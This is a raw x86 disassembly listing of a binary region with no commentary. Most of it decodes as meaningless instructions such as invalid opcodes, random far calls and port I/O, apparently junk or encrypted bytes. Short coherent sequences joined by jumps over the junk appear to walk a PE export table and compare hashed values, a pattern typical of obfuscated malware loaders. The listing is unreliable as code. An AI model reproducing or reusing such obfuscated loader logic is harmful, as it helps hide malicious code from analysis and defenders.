  403066:	mov    DWORD PTR [edx+edx*2-0x3],0xc3047658
  40306e:	retf   0x839b
  403071:	outs   dx,DWORD PTR ds:[esi]
  403072:	ds adc al,0x6c
  403075:	add    al,BYTE PTR [ebp+0x30]
  403078:	sub    al,0x3c
  40307a:	push   esp
  40307b:	mov    BYTE PTR [ecx-0x67],al
  40307e:	mov    ds:0x8458bb6,al
  403083:	mov    ecx,DWORD PTR [ebp-0x8]
  403086:	jmp    0x403325
  40308b:	ror    esp,1
  40308d:	ror    edx,1
  40308f:	ror    ecx,1
  403091:	(bad)  
  403093:	test   al,0x59
  403095:	xchg   ebx,eax
  403096:	push   edx
  403097:	fild   DWORD PTR [ebp+0x15925be0]
  40309d:	js     0x403117
  40309f:	(bad)  
  4030a0:	jle    0x40311a
  4030a2:	js     0x40311e
  4030a4:	loope  0x4030a7
  4030a6:	icebp  
  4030a7:	cdq    
  4030a8:	pop    ss
  4030a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030aa:	xchg   edi,eax
  4030ab:	arpl   WORD PTR [edi-0x55],ax
  4030ae:	call   FWORD PTR [edx]
  4030b0:	iret   
  4030b1:	test   DWORD PTR [ebp+ebx*2-0x5b],ebx
  4030b5:	push   ecx
  4030b6:	cmp    edx,DWORD PTR [edi-0x67d157f7]
  4030bc:	neg    BYTE PTR [esi+eax*4-0x6ed34192]
  4030c3:	inc    ebp
  4030c4:	jmp    0x45483993
  4030c9:	(bad)  
  4030ca:	scas   eax,DWORD PTR es:[edi]
  4030cb:	xchg   bp,ax
  4030cd:	ret    
  4030ce:	inc    esp
  4030cf:	scas   al,BYTE PTR es:[edi]
  4030d0:	ret    0x9f5a
  4030d3:	cmp    bh,BYTE PTR [edi]
  4030d5:	pop    edx
  4030d6:	test   DWORD PTR [edx-0x3b],esp
  4030d9:	fistp  DWORD PTR [ecx-0x5cbf6b3b]
  4030df:	jb     0x40308b
  4030e1:	popa   
  4030e2:	sbb    esi,0x37
  4030e5:	mov    ecx,0xd701721e
  4030ea:	fmul   DWORD PTR [esi+0x2326328f]
  4030f0:	sbb    DWORD PTR [ebx],ebx
  4030f2:	or     al,0x1
  4030f4:	jg     0x4030a4
  4030f6:	adc    DWORD PTR [esi],ebx
  4030f8:	pop    ds
  4030f9:	cmc    
  4030fa:	test   eax,0x412062a2
  4030ff:	push   esp
  403100:	or     ecx,DWORD PTR [ebp+ebp*1-0x57323e96]
  403107:	mov    bl,BYTE PTR [ebx]
  403109:	add    esp,ecx
  40310b:	jl     0x403165
  40310d:	add    eax,0xfe202baf
  403112:	jl     0x403161
  403114:	clc    
  403115:	push   es
  403116:	jmp    0x40316b
  403118:	retf   0x5aed
  40311b:	xor    DWORD PTR [esp+esi*8+0x2aa82a26],ecx
  403122:	cmp    BYTE PTR [ebp-0x76d9e318],ah
  403128:	out    dx,eax
  403129:	test   edx,ecx
  40312b:	(bad)  
  40312e:	cwde   
  40312f:	cmp    edi,edi
  403131:	dec    ecx
  403132:	mov    dl,0x18
  403134:	jg     0x403100
  403136:	push   edx
  403137:	and    eax,0x82e189dd
  40313c:	ret    0x9c19
  40313f:	ins    BYTE PTR es:[edi],dx
  403140:	inc    edx
  403141:	rcl    BYTE PTR [edx-0x6edda562],0x8a
  403148:	push   esi
  403149:	pop    edx
  40314a:	pop    esi
  40314b:	cld    
  40314c:	outs   dx,BYTE PTR ds:[esi]
  40314d:	mov    ch,0x11
  40314f:	cmc    
  403150:	out    0x65,eax
  403152:	ss xchg bl,bl
  403155:	and    edi,DWORD PTR [edi]
  403157:	int3   
  403158:	data16 lods al,BYTE PTR ds:[esi]
  40315a:	mov    cl,0x78
  40315c:	mov    bl,0x90
  40315e:	sub    al,0xd5
  403160:	ret    
  403161:	inc    edi
  403162:	mov    DWORD PTR [edx],ebp
  403164:	push   edx
  403165:	call   0x5a44:0x471a7523
  40316c:	adc    BYTE PTR [esi-0x2b],cl
  40316f:	push   ss
  403170:	out    dx,al
  403171:	mov    esp,0x2b4bec61
  403176:	or     BYTE PTR [edx-0x56],dh
  403179:	jmp    0xfac17eae
  40317e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40317f:	sbb    al,0x7f
  403181:	dec    edx
  403182:	outs   dx,BYTE PTR ds:[esi]
  403183:	sbb    al,0x81
  403185:	or     al,0x51
  403187:	or     dh,BYTE PTR [eax-0x27]
  40318a:	xchg   edi,eax
  40318b:	call   0x96a0:0xb85ec3ea
  403192:	xchg   ecx,eax
  403193:	xchg   edi,eax
  403194:	in     al,0x8f
  403196:	cdq    
  403197:	push   esi
  403198:	sti    
  403199:	push   ebx
  40319a:	xor    DWORD PTR [edx],0xffffffaf
  40319d:	addr16 xor eax,0x639549fc
  4031a3:	test   eax,0x258ed188
  4031a8:	lea    ebx,[ecx-0x25]
  4031ab:	(bad)  
  4031ad:	adc    eax,0x17da1b18
  4031b2:	mov    edx,0x466093c7
  4031b7:	fcmove st,st(0)
  4031b9:	fsub   QWORD PTR ds:0xdd36816e
  4031bf:	mov    al,ds:0x455a92e8
  4031c4:	xchg   edx,eax
  4031c5:	inc    esp
  4031c6:	je     0x4031f5
  4031c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031c9:	ficomp WORD PTR [esi]
  4031cb:	or     al,0xde
  4031cd:	mov    esp,0x67fb7bd9
  4031d2:	pop    esp
  4031d3:	dec    ebx
  4031d4:	xchg   al,bl
  4031d6:	daa    
  4031d7:	lea    ebx,[esp+0x71]
  4031db:	dec    esp
  4031dc:	adc    edx,DWORD PTR [edi+0x1c56a971]
  4031e2:	arpl   ax,bx
  4031e4:	dec    esp
  4031e5:	push   esi
  4031e6:	jp     0x40323c
  4031e8:	push   ebx
  4031e9:	jge    0x403251
  4031eb:	imul   eax,DWORD PTR [esi+edx*8+0x7d5bf9b5],0xffffffbe
  4031f3:	data16 and bl,BYTE PTR ds:0x8fd4df7e
  4031fa:	and    al,0x64
  4031fc:	int    0x4b
  4031fe:	sar    DWORD PTR [edi],0x96
  403201:	mov    ?,edx
  403203:	sahf   
  403204:	clc    
  403205:	pop    esp
  403206:	sbb    esi,0xffffffc5
  403209:	mov    eax,0xfaf14602
  40320e:	sahf   
  40320f:	adc    dh,BYTE PTR [esi-0x22]
  403212:	ret    
  403213:	or     ecx,DWORD PTR [esi-0x5a]
  403216:	sbb    BYTE PTR [esp+ebp*8],ch
  403219:	jmp    0xbd1b78ae
  40321e:	jp     0x40326f
  403220:	jmp    0x63df7d70
  403225:	out    0xe2,al
  403227:	mul    BYTE PTR [eax+0x667c3f41]
  40322d:	sbb    edx,DWORD PTR [eax+0x32f2aaea]
  403233:	cwde   
  403234:	inc    edx
  403235:	icebp  
  403236:	dec    ecx
  403237:	ds cmps DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40323a:	retf   0x83f
  40323d:	fdiv   QWORD PTR [edx+0x2c]
  403240:	cli    
  403241:	arpl   WORD PTR [ebx+0x4e],cx
  403244:	sbb    DWORD PTR [ebp-0x5518a5b9],esp
  40324a:	leave  
  40324b:	jp     0x403273
  40324d:	and    al,0xca
  40324f:	test   eax,0xd35f8119
  403254:	jne    0x40329a
  403256:	iret   
  403257:	inc    ecx
  403258:	mov    al,dl
  40325a:	or     bh,BYTE PTR [edx+eax*1]
  40325d:	push   edx
  40325e:	aad    0xaf
  403260:	int    0xd6
  403262:	mov    bh,0x3d
  403264:	pop    ecx
  403265:	ins    DWORD PTR es:[edi],dx
  403266:	push   0x77
  403268:	cmp    al,0xd6
  40326a:	fwait
  40326b:	(bad)  
  40326c:	push   ds
  40326d:	cs xor BYTE PTR es:[eax-0x5f],dl
  403272:	js     0x4031f4
  403274:	mov    dh,0xb3
  403276:	pop    eax
  403277:	adc    ah,BYTE PTR [esi]
  403279:	mov    BYTE PTR [eax],dl
  40327b:	adc    al,0x65
  40327d:	xor    ebp,DWORD PTR [edi+0x58bc590a]
  403283:	into   
  403284:	jmp    0xb428:0xc04561ba
  40328b:	daa    
  40328c:	mov    ebp,0x736f03fa
  403291:	cmp    edi,eax
  403293:	jno    0x4032d0
  403295:	jns    0x4032a8
  403297:	add    eax,0xa2d2e578
  40329c:	sub    eax,DWORD PTR [ebx-0x24]
  40329f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032a0:	shl    BYTE PTR [ecx-0x77],1
  4032a3:	dec    eax
  4032a4:	xchg   bl,ah
  4032a6:	add    DWORD PTR [esi-0x1654167a],edx
  4032ac:	(bad)  
  4032ad:	call   0x190f7d40
  4032b2:	gs xchg ecx,eax
  4032b4:	and    DWORD PTR [edx],eax
  4032b6:	mov    al,ds:0xce416f83
  4032bb:	jno    0x40327c
  4032bd:	mov    cl,0x67
  4032bf:	jb     0x403333
  4032c1:	xchg   ebx,eax
  4032c2:	push   ds
  4032c3:	inc    ebx
  4032c4:	or     eax,0x1a6f3b8e
  4032c9:	mov    esi,0x5ea36038
  4032ce:	dec    edi
  4032cf:	into   
  4032d0:	and    ch,BYTE PTR [ebp+0x2f]
  4032d3:	adc    BYTE PTR [esi],ah
  4032d5:	mov    WORD PTR [edi-0x7e],cs
  4032d8:	dec    esp
  4032d9:	ret    
  4032da:	ror    DWORD PTR [esi],cl
  4032dc:	and    edx,DWORD PTR [esi+0x2530c070]
  4032e2:	jg     0x403329
  4032e4:	cmp    al,0x50
  4032e6:	push   ebp
  4032e7:	pushf  
  4032e8:	ror    BYTE PTR fs:[esi-0x59],1
  4032ec:	push   ss
  4032ed:	or     eax,0x54f857b9
  4032f2:	rcr    BYTE PTR [esi+edx*2-0x7c],0xc8
  4032f7:	enter  0xc085,0x89
  4032fb:	loopne 0x40335d
  4032fd:	fisubr DWORD PTR [edx+0x1eb03b0d]
  403303:	fadd   DWORD PTR [ebx-0x5b]
  403306:	dec    edi
  403307:	and    eax,0x1f0116b1
  40330c:	inc    ebx
  40330d:	stc    
  40330e:	loop   0x403345
  403310:	data16 xlat BYTE PTR ds:[ebx]
  403312:	and    BYTE PTR ss:[ebx-0x2a],0xd3
  403317:	imul   BYTE PTR [edx+edx*4+0x6b]
  40331b:	lds    edx,FWORD PTR [edx-0x7c89b3b6]
  403321:	inc    esi
  403322:	mov    eax,ds:0xc633b10b
  403327:	add    eax,edi
  403329:	cmp    DWORD PTR [ecx],eax
  40332b:	je     0x4040c9
  403331:	mov    ecx,DWORD PTR [ebp-0x14]
  403334:	mov    eax,DWORD PTR [ebp-0x8]
  403337:	mov    eax,DWORD PTR [eax]
  403339:	mov    eax,DWORD PTR [eax+0x3c]
  40333c:	lea    ecx,[ecx*8+0x78]
  403343:	add    eax,ecx
  403345:	mov    ecx,DWORD PTR [ebp-0x8]
  403348:	mov    ecx,DWORD PTR [ecx]
  40334a:	mov    eax,DWORD PTR [eax+ecx*1]
  40334d:	mov    DWORD PTR [ebp-0x1c],eax
  403350:	mov    eax,DWORD PTR [ebp+0x8]
  403353:	xor    eax,esi
  403355:	add    eax,edi
  403357:	mov    DWORD PTR [ebp-0x20],eax
  40335a:	mov    eax,DWORD PTR [ebp+0x8]
  40335d:	mov    ecx,DWORD PTR [ebp-0x1c]
  403360:	jmp    0x4035ff
  403365:	(bad)  
  403366:	cmp    al,0xcf
  403368:	cmp    al,0xd9
  40336a:	rcr    ecx,cl
  40336c:	fidiv  DWORD PTR [ecx+0x2ec23cb6]
  403372:	xchg   edx,eax
  403373:	pop    edi
  403374:	inc    esp
  403375:	adc    BYTE PTR [edx],bl
  403377:	js     0x4033f1
  403379:	(bad)  
  40337a:	jle    0x4033f4
  40337c:	js     0x40332c
  40337e:	mov    WORD PTR [esi+esi*8+0x3a],?
  403382:	xor    ch,BYTE PTR ds:0xd70dac52
  403388:	inc    dl
  40338a:	ins    BYTE PTR es:[edi],dx
  40338b:	int3   
  40338c:	out    0xf0,al
  40338e:	popa   
  40338f:	dec    eax
  403390:	cmp    bh,BYTE PTR [eax]
  403392:	das    
  403393:	sbb    al,0x7b
  403395:	push   0xd1dea4f9
  40339a:	outs   dx,DWORD PTR ds:[esi]
  40339b:	cmp    BYTE PTR [ebp-0x3affb45e],dl
  4033a1:	aad    0x92
  4033a3:	push   cs
  4033a4:	dec    ebp
  4033a5:	fstp   TBYTE PTR [eax-0x553feb10]
  4033ab:	sub    DWORD PTR [ebp+0xbc72ac6],esi
  4033b1:	pop    esp
  4033b2:	push   ecx
  4033b3:	(bad)  
  4033b4:	adc    BYTE PTR [eax-0x68],cl
  4033b7:	xlat   BYTE PTR ds:[ebx]
  4033b8:	std    
  4033b9:	popa   
  4033ba:	and    edx,esi
  4033bc:	scas   al,BYTE PTR es:[edi]
  4033bd:	mov    BYTE PTR [esi],ah
  4033bf:	add    al,0x43
  4033c1:	loope  0x40336c
  4033c3:	inc    ebp
  4033c4:	jne    0x4033be
  4033c6:	les    esp,FWORD PTR [ecx-0x6e]
  4033c9:	test   ebx,eax
  4033cb:	scas   al,BYTE PTR es:[edi]
  4033cc:	and    cl,BYTE PTR [eax+0x11]
  4033cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033d0:	pop    ebx
  4033d1:	pop    ss
  4033d2:	out    0xbc,eax
  4033d4:	loop   0x4033f8
  4033d6:	mov    dh,0xac
  4033d8:	add    eax,0x24e7d6ce
  4033dd:	in     eax,0x97
  4033df:	ins    DWORD PTR es:[edi],dx
  4033e0:	mov    eax,ds:0x96072357
  4033e5:	ins    BYTE PTR es:[edi],dx
  4033e6:	push   esp
  4033e7:	cmp    DWORD PTR [ebp-0x25444c9b],esi
  4033ed:	sbb    DWORD PTR [ebx+0x56],0xfffffff6
  4033f1:	push   0xfa16a1e1
  4033f6:	sti    
  4033f7:	mov    DWORD PTR [edx+0x372d8f25],esi
  4033fd:	shl    ah,cl
  4033ff:	cld    
  403400:	sub    DWORD PTR [edx-0x28],ecx
  403403:	or     al,0x3d
  403405:	lea    ecx,ds:0x6a69121a
  40340b:	sbb    DWORD PTR ds:0x82ad6485,ebx
  403411:	cmp    DWORD PTR [edi-0x55ff6a95],ebp
  403417:	dec    ecx
  403418:	xchg   esp,eax
  403419:	ds dec ecx
  40341b:	mov    ?,WORD PTR [ebx-0x5e]
  40341e:	push   es
  40341f:	jmp    0x9108d24f
  403424:	sub    esi,DWORD PTR [ecx]
  403426:	aad    0xc7
  403428:	add    al,0x24
  40342a:	adc    BYTE PTR [esp+eax*8+0x21],ch
  40342e:	push   eax
  40342f:	mov    dh,0x88
  403431:	dec    eax
  403432:	xchg   esp,eax
  403433:	jp     0x4033e4
  403435:	mov    ecx,0x190c547
  40343a:	lock push 0xffffffd1
  40343d:	mov    BYTE PTR [eax],ch
  40343f:	xchg   esp,eax
  403440:	dec    eax
  403441:	dec    ebp
  403442:	adc    bh,BYTE PTR [ecx+edx*1-0x32a34827]
  403449:	jb     0x40343c
  40344b:	and    BYTE PTR [ebx],cl
  40344d:	inc    eax
  40344e:	scas   al,BYTE PTR es:[edi]
  40344f:	sub    BYTE PTR [esi+ecx*2],0x62
  403453:	imul   ecx,DWORD PTR [eax-0x53],0x13
  403457:	add    ebp,edi
  403459:	push   ecx
  40345a:	out    0x50,eax
  40345c:	jle    0x4034b1
  40345e:	sbb    al,0x26
  403460:	inc    edi
  403461:	add    dl,BYTE PTR [ebx-0x6cc1e79a]
  403467:	push   eax
  403468:	and    ecx,eax
  40346a:	mov    ecx,0x9107472e
  40346f:	sbb    al,BYTE PTR [ebp-0xea496b7]
  403475:	inc    edx
  403476:	pop    ebx
  403477:	aam    0xfe
  403479:	xor    cl,ch
  40347b:	pop    esp
  40347c:	enter  0x3534,0x45
  403480:	mov    eax,0xcbafa4
  403485:	into   
  403486:	pop    ebp
  403487:	adc    DWORD PTR [ebx],esi
  403489:	xchg   esp,eax
  40348a:	inc    edi
  40348b:	enter  0xb84c,0x16
  40348f:	dec    eax
  403490:	pop    DWORD PTR [ecx+0x30]
  403493:	sahf   
  403494:	sbb    dl,BYTE PTR [ebx+0x1b]
  403497:	or     eax,0x36d01bfc
  40349c:	aad    0x47
  40349e:	ds dec esp
  4034a0:	xchg   DWORD PTR [ecx-0x4bbd33d],ecx
  4034a6:	pop    edx
  4034a7:	inc    edi
  4034a8:	fcom   DWORD PTR [ebx]
  4034aa:	inc    ebx
  4034ab:	xor    dl,BYTE PTR [ebp-0x2d42c45e]
  4034b1:	into   
  4034b2:	cmp    ch,BYTE PTR [ebx+0x38a8c1ba]
  4034b8:	push   esp
  4034b9:	adc    bl,BYTE PTR [ebx]
  4034bb:	das    
  4034bc:	pavgb  mm3,QWORD PTR gs:[ebx-0x46af948d]
  4034c4:	xchg   edx,eax
  4034c5:	in     eax,0x15
  4034c7:	js     0x4034d7
  4034c9:	(bad)  
  4034ca:	jmp    0x80267437
  4034cf:	dec    esi
  4034d0:	mov    ah,0x61
  4034d2:	dec    ecx
  4034d3:	rcr    BYTE PTR [edx+0x72],0xaa
  4034d7:	pushf  
  4034d8:	lahf   
  4034d9:	mov    dh,0x42
  4034db:	xlat   BYTE PTR ds:[ebx]
  4034dc:	data16 jbe 0x403489
  4034df:	lea    edi,[esi]
  4034e1:	leave  
  4034e2:	mov    ds:0x2106aa7c,al
  4034e7:	jns    0x40346c
  4034e9:	ins    BYTE PTR es:[edi],dx
  4034ea:	fist   WORD PTR [eax]
  4034ec:	adc    dh,BYTE PTR fs:[eax-0xb]
  4034f0:	enter  0xff90,0x6e
  4034f4:	xchg   DWORD PTR [ebx+0x3205733],eax
  4034fa:	test   dl,0xca
  4034fd:	sub    eax,0x171d10a7
  403502:	lods   al,BYTE PTR ds:[esi]
  403503:	pusha  
  403504:	xchg   DWORD PTR [edi+0x78],eax
  403507:	mov    ds:0xa940917e,al
  40350c:	nop
  40350d:	adc    ebx,DWORD PTR [ebp+0x79]
  403510:	test   DWORD PTR [eax],edx
  403512:	xchg   edi,eax
  403513:	and    BYTE PTR [edi+0x1c],dh
  403516:	dec    edi
  403517:	outs   dx,BYTE PTR ds:[esi]
  403518:	in     eax,0xe8
  40351a:	cdq    
  40351b:	inc    edx
  40351c:	or     ecx,DWORD PTR [ebx+ebp*4]
  40351f:	mov    bh,0xe3
  403521:	mov    ebx,ebx
  403523:	test   eax,0x8ff8655c
  403528:	or     esi,DWORD PTR [ebx]
  40352a:	test   eax,0x76744046
  40352f:	add    ecx,0x68795026
  403535:	data16 (bad) 
  403537:	fbstp  TBYTE PTR [edx+ebx*1]
  40353a:	jmp    0x800:0x9cd86511
  403541:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403542:	test   DWORD PTR [eax],ecx
  403544:	pop    ebx
  403545:	and    BYTE PTR [edi+0x68af0a7],bh
  40354b:	mov    ch,0xfa
  40354d:	pop    ss
  40354e:	sbb    BYTE PTR [ebx+0x1e760206],0xc4
  403555:	retf   0x7071
  403558:	sub    eax,0xb107b0c3
  40355d:	pushf  
  40355e:	jmp    0xf239:0x771d56a2
  403565:	jecxz  0x40352d
  403567:	inc    esp
  403568:	inc    ebp
  403569:	loope  0x4034fb
  40356b:	add    BYTE PTR [esi],ch
  40356d:	xchg   ebx,eax
  40356e:	push   edi
  40356f:	inc    eax
  403570:	and    BYTE PTR [edi],cl
  403572:	mov    ch,BYTE PTR ds:0xcd3e1bdc
  403578:	faddp  st(5),st
  40357b:	pusha  
  40357c:	jo     0x403516
  40357e:	cli    
  40357f:	jecxz  0x403561
  403581:	jmp    0x403567
  403583:	ret    
  403584:	lods   eax,DWORD PTR ds:[esi]
  403585:	add    eax,0xcbbf6cbc
  40358a:	call   0x921:0xb358d1ee
  403591:	les    ecx,FWORD PTR ds:0xee3a7b55
  403597:	push   eax
  403598:	adc    eax,0xb48f7d63
  40359d:	xchg   esi,eax
  40359e:	pop    esi
  40359f:	adc    ecx,DWORD PTR [ebx]
  4035a1:	ins    DWORD PTR es:[edi],dx
  4035a2:	push   esi
  4035a3:	pop    es
  4035a4:	nop
  4035a5:	call   0x2380:0xf6e31132
  4035ac:	cld    
  4035ad:	mov    dl,0x5c
  4035af:	bound  eax,QWORD PTR [esi-0x1d]
  4035b2:	jb     0x403620
  4035b4:	jns    0x403581
  4035b6:	xchg   edi,eax
  4035b7:	push   es
  4035b8:	popa   
  4035b9:	aaa    
  4035ba:	dec    edx
  4035bb:	cdq    
  4035bc:	int3   
  4035bd:	adc    DWORD PTR [esi+0x33ba516a],edx
  4035c3:	and    cl,BYTE PTR [ebx]
  4035c5:	mov    edx,0xfd0d5de7
  4035ca:	popf   
  4035cb:	cmp    DWORD PTR [edx-0x61c9065a],ebx
  4035d1:	leave  
  4035d2:	push   DWORD PTR [edi]
  4035d4:	pusha  
  4035d5:	mov    bl,0x60
  4035d7:	rcl    DWORD PTR [ecx-0x23],cl
  4035da:	jae    0x40358b
  4035dc:	add    eax,0x9d55799e
  4035e1:	cwde   
  4035e2:	add    al,0x79
  4035e4:	cmp    eax,0xd3482aae
  4035e9:	sti    
  4035ea:	imul   eax,DWORD PTR fs:[ecx],0xd3ed3a36
  4035f1:	data16 or BYTE PTR [edx],bl
  4035f4:	xor    DWORD PTR [esi+eiz*4],0x38
  4035f8:	dec    esi
  4035f9:	lods   eax,DWORD PTR ds:[esi]
  4035fa:	dec    edx
  4035fb:	or     BYTE PTR [ebp-0x39cccb18],al
  403601:	add    eax,edi
  403603:	cmp    ecx,eax
  403605:	je     0x404380
  40360b:	mov    eax,DWORD PTR [ebp-0x8]
  40360e:	mov    ecx,DWORD PTR [ebp-0x1c]
  403611:	add    ecx,DWORD PTR [eax]
  403613:	mov    DWORD PTR [ebp-0x20],ecx
  403616:	mov    eax,DWORD PTR [ebp-0x20]
  403619:	mov    ecx,DWORD PTR [ebp-0x8]
  40361c:	mov    eax,DWORD PTR [eax+0xc]
  40361f:	mov    ecx,DWORD PTR [ecx]
  403621:	jmp    0x4038c0
  403626:	xlat   BYTE PTR ds:[ebx]
  403627:	aas    
  403628:	mov    al,0xd6
  40362b:	(bad)
  40362e:	fwait
  40362f:	clc    
  403630:	mov    BYTE PTR ds:0x8674c883,0x96
  403637:	sbb    BYTE PTR [eax+0x78],bh
  40363a:	(bad)  
  40363b:	jle    0x4036b5
  40363d:	js     0x403664
  40363f:	mov    ds:0x28169085,eax
  403644:	push   ebp
  403645:	mov    eax,0xfc27cf15
  40364a:	cmp    DWORD PTR [ebx-0x9],ecx
  40364d:	or     ch,BYTE PTR [ebx-0x37]
  403650:	mov    ebx,0xee01a6d1
  403655:	mov    edi,0x2ed2094e
  40365a:	push   eax
  40365b:	ins    BYTE PTR es:[edi],dx
  40365c:	retf   
  40365d:	clc    
  40365e:	outs   dx,DWORD PTR ds:[esi]
  40365f:	mov    ds:0x2432d32b,al
  403664:	lea    ebp,[edi*8-0x412cea71]
  40366b:	lods   al,BYTE PTR ds:[esi]
  40366c:	push   DWORD PTR [edx+edx*2]
  40366f:	(bad)  
  403670:	sbb    BYTE PTR [eax-0x7ef57b94],dh
  403676:	mov    ds:0x18a63b64,al
  40367b:	ret    
  40367c:	pop    ss
  40367d:	in     al,0x1
  40367f:	ins    DWORD PTR es:[edi],dx
  403680:	hlt    
  403681:	mov    cl,0x35
  403683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403684:	imul   edx,DWORD PTR [ebx],0x14
  403687:	or     al,0x15
  403689:	xchg   ebp,eax
  40368a:	in     eax,0x1b
  40368c:	mov    edx,0xcaa6f746
  403691:	jmp    0x4036a1
  403693:	mov    esi,0x51f8184e
  403698:	stos   BYTE PTR es:[edi],al
  403699:	shr    DWORD PTR [ebx],cl
  40369b:	shl    BYTE PTR [ebx+0x74],1
  40369e:	jns    0x40370d
  4036a0:	rcr    DWORD PTR [edx*8+0x30c439d4],0x64
  4036a8:	mov    edx,0xfe17cd78
  4036ad:	push   esi
  4036ae:	(bad)  
  4036af:	pop    eax
  4036b0:	jne    0x403676
  4036b2:	loope  0x4036a5
  4036b4:	mov    eax,ds:0xf6ec8aa1
  4036b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036ba:	mov    ah,0xeb
  4036bc:	jnp    0x4036b2
  4036be:	dec    esi
  4036bf:	cmp    eax,0x898abcd
  4036c4:	and    WORD PTR [edx-0x24],ax
  4036c8:	mov    edx,0xab7014dd
  4036cd:	jb     0x40366d
  4036cf:	xlat   BYTE PTR ds:[ebx]
  4036d0:	cmp    al,bl
  4036d2:	(bad)  
  4036d3:	push   esp
  4036d4:	and    eax,0xdfdb3ab
  4036d9:	push   ebp
  4036da:	jp     0x4036f2
  4036dc:	ret    
  4036dd:	xor    DWORD PTR [eax-0x31],esi
  4036e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036e1:	xchg   ebp,eax
  4036e2:	mov    ecx,ebx
  4036e4:	out    0x69,al
  4036e6:	mov    ds:0xf4cb77d9,al
  4036eb:	arpl   WORD PTR [edx+0x46],si
  4036ee:	push   ss
  4036ef:	mov    eax,ds:0xb5ac01b9
  4036f4:	repnz xchg ecx,eax
  4036f6:	cwde   
  4036f7:	lods   eax,DWORD PTR ds:[esi]
  4036f8:	test   DWORD PTR [ebx+0x40],eax
  4036fb:	dec    ebx
  4036fc:	mov    esp,0xedcb1581
  403701:	or     cl,BYTE PTR [edx+0x2b]
  403704:	dec    edx
  403705:	dec    ebx
  403706:	push   ss
  403707:	dec    edx
  403708:	xchg   edx,eax
  403709:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40370a:	sub    ecx,DWORD PTR [eax-0x58]
  40370d:	inc    edx
  40370e:	lods   eax,DWORD PTR ds:[esi]
  40370f:	and    ebp,DWORD PTR [esi-0x3e]
  403712:	inc    ebp
  403713:	dec    edi
  403714:	inc    esi
  403715:	sbb    eax,0x871a716b
  40371a:	test   DWORD PTR [ebp+0x1993422b],esi
  403720:	push   cs
  403721:	cmp    BYTE PTR [ecx],dl
  403723:	push   0x9a0eaf9d
  403728:	test   al,0xe0
  40372a:	hlt    
  40372b:	or     dl,BYTE PTR [ebx+0x43]
  40372e:	pop    ecx
  40372f:	loopne 0x40378d
  403731:	into   
  403732:	lds    ecx,FWORD PTR [ebx]
  403734:	lods   eax,DWORD PTR ds:[esi]
  403735:	cmp    BYTE PTR [ecx-0x222a1a32],bh
  40373b:	outs   dx,DWORD PTR ds:[esi]
  40373c:	mov    cs,edi
  40373e:	adc    DWORD PTR [ebp-0x2faeb110],esi
  403744:	mov    ecx,0x7a03a413
  403749:	ror    DWORD PTR [edx+0x552ff237],1
  40374f:	enter  0x9670,0xc4
  403753:	xchg   esp,eax
  403754:	arpl   WORD PTR [edx-0x3b],sp
  403757:	adc    dl,BYTE PTR [ebx-0x4a]
  40375a:	push   es
  40375b:	inc    esp
  40375c:	repz addr16 cmp bh,dl
  403760:	and    DWORD PTR [ebx-0x53],0xe1ce39e
  403767:	xchg   DWORD PTR [eax-0x5c],ebp
  40376a:	rcl    DWORD PTR [eax-0x51ab216b],1
  403770:	dec    ecx
  403771:	lods   eax,DWORD PTR ds:[esi]
  403772:	ins    DWORD PTR es:[edi],dx
  403773:	dec    ebp
  403774:	pop    eax
  403775:	inc    edi
  403776:	ds inc edx
  403778:	mov    BYTE PTR ds:0x694c1772,cl
  40377e:	loopne 0x403757
  403780:	call   0xe7b5:0xc3b6b2d2
  403787:	xchg   esp,eax
  403788:	mov    esi,0xce306902
  40378d:	sbb    BYTE PTR [edi-0x6ca02983],dl
  403793:	mov    ebx,0x51403289
  403798:	xchg   esp,eax
  403799:	iret   
  40379a:	mov    eax,ds:0xd9c5acef
  40379f:	pop    ebx
  4037a0:	mov    BYTE PTR [ebx+0x6084f774],cl
  4037a6:	popa   
  4037a7:	sub    DWORD PTR ds:0xb842e978,ebp
  4037ad:	sbb    ebp,esi
  4037af:	inc    esi
  4037b0:	rcl    BYTE PTR [eax+0x17],0x23
  4037b4:	rol    DWORD PTR [esp+eax*4],cl
  4037b7:	pusha  
  4037b8:	mov    ds:0x780d4350,al
  4037bd:	cli    
  4037be:	add    dl,dh
  4037c0:	into   
  4037c1:	retf   
  4037c2:	xchg   edi,eax
  4037c3:	fld    TBYTE PTR [edx+0x63]
  4037c6:	xchg   ebx,eax
  4037c7:	imul   ebx,DWORD PTR [ecx],0x344f6239
  4037cd:	sbb    eax,0xd828e81e
  4037d2:	pop    eax
  4037d3:	lahf   
  4037d4:	push   es
  4037d5:	cwde   
  4037d6:	imul   edi,DWORD PTR gs:[edx],0xe22bc833
  4037dd:	jno    0x403803
  4037df:	cmovae eax,DWORD PTR [ebp-0x44]
  4037e3:	mov    bh,0x32
  4037e5:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037e7:	xchg   esp,eax
  4037e8:	clc    
  4037e9:	imul   ecx,DWORD PTR [ebx],0xffffffd2
  4037ec:	and    eax,0xd25c53ab
  4037f1:	pop    edx
  4037f2:	ja     0x4037c6
  4037f4:	cmc    
  4037f5:	(bad)  
  4037f6:	and    eax,0xaa21b32f
  4037fb:	xor    esp,ecx
  4037fd:	fdiv   st(3),st
  4037ff:	pop    esp
  403800:	aad    0x1
  403802:	je     0x40383f
  403804:	push   0xffffffab
  403806:	sbb    eax,0x51a9fa40
  40380b:	xor    BYTE PTR [edi-0x36],dh
  40380e:	int3   
  40380f:	fild   WORD PTR [ebx-0x62]
  403812:	je     0x403865
  403814:	mov    bh,0xc9
  403816:	add    eax,0x78d3d88
  40381b:	inc    esp
  40381c:	imul   ebx,DWORD PTR [esi+0x47],0xfefdfda7
  403823:	ror    DWORD PTR ds:0xce89b409,1
  403829:	adc    BYTE PTR [edx+0x73918975],bh
  40382f:	lods   eax,DWORD PTR ds:[esi]
  403830:	and    eax,0xf3b6880f
  403835:	xchg   ebx,eax
  403836:	aaa    
